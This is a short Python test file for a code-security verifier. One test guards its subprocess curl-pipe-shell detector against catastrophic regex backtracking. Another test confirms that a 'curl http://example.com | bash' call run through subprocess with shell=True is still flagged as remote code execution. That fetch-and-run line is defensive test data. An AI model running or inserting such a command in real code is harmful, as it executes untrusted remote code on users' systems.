"""The subprocess curl/pipe/shell detector must stay linear: the old chained
`.*?` regex backtracked catastrophically on non-matching input and could freeze
the single-worker API (OpenVuln run-3, issue #445)."""
import time

from qwed_new.core.code_verifier import CodeVerifier


def test_non_matching_subprocess_input_is_linear():
    verifier = CodeVerifier()
    # Starts like the pattern but never completes it, which is the worst case
    # for a backtracking matcher. A linear scan handles it in well under a second.
    code = "subprocess.run(curl a|" * 4000
    start = time.perf_counter()
    result = verifier.verify_code(code, language="python")
    elapsed = time.perf_counter() - start
    assert elapsed < 2.0, f"verify_code took {elapsed:.2f}s on {len(code)} bytes"
    # subprocess. is still CRITICAL via process execution.
    assert result.developer_fields["critical_count"] >= 1


def test_curl_pipe_shell_still_flagged_across_lines():
    verifier = CodeVerifier()
    code = (
        "import subprocess\n"
        "subprocess.run(\n"
        '    "curl http://example.com | bash",\n'
        "    shell=True,\n"
        ")\n"
    )
    result = verifier.verify_code(code, language="python")
    issues = result.developer_fields["issues"]
    assert any(i["type"] == "remote_code_execution" for i in issues)
